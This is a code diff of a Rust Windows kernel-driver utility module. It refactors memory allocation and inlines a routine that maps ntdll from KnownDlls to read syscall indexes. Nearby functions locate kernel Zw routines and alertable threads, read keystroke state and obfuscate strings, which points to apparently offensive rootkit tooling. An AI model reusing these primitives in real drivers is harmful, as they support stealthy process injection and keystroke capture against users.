@@ -1,30 +1,20 @@
 use {
     crate::{includes::{structs::SystemModuleInformation, PsGetProcessPeb}, process::Process}, 
-    alloc::{string::String, vec, vec::Vec}, 
+    alloc::{string::String, vec::Vec, vec}, 
     core::{
-        ffi::{c_void, CStr}, 
-        mem::{size_of, zeroed}, 
-        ptr::{null_mut, read, read_unaligned},
-        fmt::Write,
-        slice::from_raw_parts
+        ffi::{c_void, CStr}, fmt::Write, mem::{size_of, zeroed}, ptr::{null_mut, read, read_unaligned}, slice::from_raw_parts
     }, 
     ntapi::{
-        ntexapi::{SystemModuleInformation, SystemProcessInformation, PSYSTEM_PROCESS_INFORMATION}, 
-        ntzwapi::ZwQuerySystemInformation,
-        ntldr::LDR_DATA_TABLE_ENTRY,
-        ntpebteb::PEB,
+        ntexapi::{SystemModuleInformation, SystemProcessInformation, PSYSTEM_PROCESS_INFORMATION}, ntldr::LDR_DATA_TABLE_ENTRY, ntpebteb::PEB, ntzwapi::ZwQuerySystemInformation
     }, 
     obfstr::obfstr, 
     wdk_sys::{
-        *,
-        ntddk::*,
-        _FILE_INFORMATION_CLASS::FileStandardInformation,
-        _SECTION_INHERIT::ViewUnmap
+        ntddk::*, _FILE_INFORMATION_CLASS::FileStandardInformation, _SECTION_INHERIT::ViewUnmap, *
     }, 
     winapi::um::winnt::{
         RtlZeroMemory, IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY, 
         IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER
-    },
+    }, _POOL_TYPE::NonPagedPool,
 };
 
 #[cfg(not(test))]
@@ -90,9 +80,9 @@ pub unsafe fn get_module_base_address(module_name: &str) -> Option<*mut c_void> 
     let mut return_bytes = 0;
     ZwQuerySystemInformation(SystemModuleInformation, null_mut(), 0, &mut return_bytes);
 
-    let info_module = ExAllocatePool2(POOL_FLAG_NON_PAGED, return_bytes as u64, u32::from_be_bytes(*b"ardl")) as *mut SystemModuleInformation;
+    let info_module = ExAllocatePool(NonPagedPool, return_bytes as u64) as *mut SystemModuleInformation;
     if info_module.is_null() {
-        log::error!("ExAllocatePool2 Failed");
+        log::error!("ExAllocatePool Failed");
         return None;
     }
 
@@ -106,6 +96,7 @@ pub unsafe fn get_module_base_address(module_name: &str) -> Option<*mut c_void> 
     );
     if !NT_SUCCESS(status) {
         log::error!("ZwQuerySystemInformation [2] Failed With Status: {status}");
+        ExFreePool(info_module as _);
         return None;
     }
 
@@ -121,6 +112,7 @@ pub unsafe fn get_module_base_address(module_name: &str) -> Option<*mut c_void> 
         }
     }
 
+    ExFreePool(info_module as _);
     None
 }
 
@@ -212,9 +204,9 @@ pub unsafe fn get_address_asynckey(name: &str, dll_base: *mut c_void) -> Option<
 pub unsafe fn get_process_by_name(process_name: &str) -> Option<usize> {
     let mut return_bytes = 0;
     ZwQuerySystemInformation(SystemProcessInformation, null_mut(), 0, &mut return_bytes);
-    let info_process = ExAllocatePool2(POOL_FLAG_NON_PAGED, return_bytes as u64,  u32::from_be_bytes(*b"zerw")) as PSYSTEM_PROCESS_INFORMATION;
+    let info_process = ExAllocatePool(NonPagedPool, return_bytes as u64) as PSYSTEM_PROCESS_INFORMATION;
     if info_process.is_null() {
-        log::error!("ExAllocatePool2 Failed");
+        log::error!("ExAllocatePool Failed");
         return None;
     }
 
@@ -262,10 +254,36 @@ pub unsafe fn get_process_by_name(process_name: &str) -> Option<usize> {
 /// - `Option<u16>`: The syscall index if found, or `None` if an error occurs or the function is not found.
 /// 
 pub unsafe fn get_syscall_index(function_name: &str) -> Option<u16> {
-    let (section_handle, ntdll_addr) = match map_dll(obfstr!("\\KnownDlls\\ntdll.dll")) {
-        Some(infos) => infos,
-        None => return None
-    };
+    let mut section_handle = null_mut();
+    let dll = crate::utils::uni::str_to_unicode("\\KnownDlls\\ntdll.dll");
+    let mut obj_attr = InitializeObjectAttributes(Some(&mut dll.to_unicode()), OBJ_CASE_INSENSITIVE, None, None, None);
+    let mut status = ZwOpenSection(&mut section_handle, SECTION_MAP_READ | SECTION_QUERY, &mut obj_attr);
+    if !NT_SUCCESS(status) {
+        log::error!("ZwOpenSection Failed With Status: {status}");
+        return None
+    }
+
+    let mut large: LARGE_INTEGER = zeroed();
+    let mut ntdll_addr = null_mut();
+    let mut view_size = 0;
+    status = ZwMapViewOfSection(
+        section_handle, 
+        0xFFFFFFFFFFFFFFFF as *mut core::ffi::c_void, 
+        &mut ntdll_addr, 
+        0, 
+        0, 
+        &mut large, 
+        &mut view_size, 
+        ViewUnmap, 
+        0,
+        PAGE_READONLY,
+    );
+    if !NT_SUCCESS(status) {
+        log::error!("ZwMapViewOfSection Failed With Status: {status}");
+        ZwClose(section_handle);
+        return None
+    }
+
 
     let dos_header = ntdll_addr as *const IMAGE_DOS_HEADER;
     let nt_header = (ntdll_addr as usize + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
@@ -386,48 +404,6 @@ pub unsafe fn get_module_peb(pid: usize, module_name: &str, function_name: &str)
     None
 }
 
-/// Maps a DLL into memory.
-///
-/// # Parameters
-/// - `name`: The name of the DLL to be mapped.
-///
-/// # Returns
-/// - `Option<(HANDLE, *mut c_void)>`: Containing the handle to the section and a pointer to the mapped view if successful.
-///
-pub unsafe fn map_dll(name: &str) -> Option<(HANDLE, *mut c_void)> {
-    let mut section_handle = null_mut();
-    let dll = crate::utils::uni::str_to_unicode(name);
-    let mut obj_attr = InitializeObjectAttributes(Some(&mut dll.to_unicode()), OBJ_CASE_INSENSITIVE, None, None, None);
-    let mut status = ZwOpenSection(&mut section_handle, SECTION_MAP_READ | SECTION_QUERY, &mut obj_attr);
-    if !NT_SUCCESS(status) {
-        log::error!("ZwOpenSection Failed With Status: {status}");
-        return None
-    }
-
-    let mut large: LARGE_INTEGER = zeroed();
-    let mut addr = null_mut();
-    let mut view_size = 0;
-    status = ZwMapViewOfSection(
-        section_handle, 
-        0xFFFFFFFFFFFFFFFF as *mut core::ffi::c_void, 
-        &mut addr, 
-        0, 
-        0, 
-        &mut large, 
-        &mut view_size, 
-        ViewUnmap, 
-        0,
-        PAGE_READONLY,
-    );
-    if !NT_SUCCESS(status) {
-        log::error!("ZwMapViewOfSection Failed With Status: {status}");
-        ZwClose(section_handle);
-        return None
-    }
-
-    Some((section_handle, addr))
-}
-
 /// Finds the address of a specified Zw function.
 /// 
 /// # Parameters
@@ -441,6 +417,7 @@ pub unsafe fn find_zw_function(name: &str) -> Option<usize> {
         Some(ssn) => ssn,
         None => return None,
     };
+
     let ntoskrnl_addr = match get_module_base_address(obfstr!("ntoskrnl.exe")) {
         Some(addr) => addr,
         None => return None,
@@ -502,8 +479,6 @@ pub unsafe fn find_thread_alertable(target_pid: usize) -> Option<*mut _KTHREAD> 
         log::error!("ExAllocatePool2 Failed");
         return None;
     }
-
-    RtlZeroMemory(info_process as *mut _, return_bytes as usize);
 
     let status = ZwQuerySystemInformation(
         SystemProcessInformation,
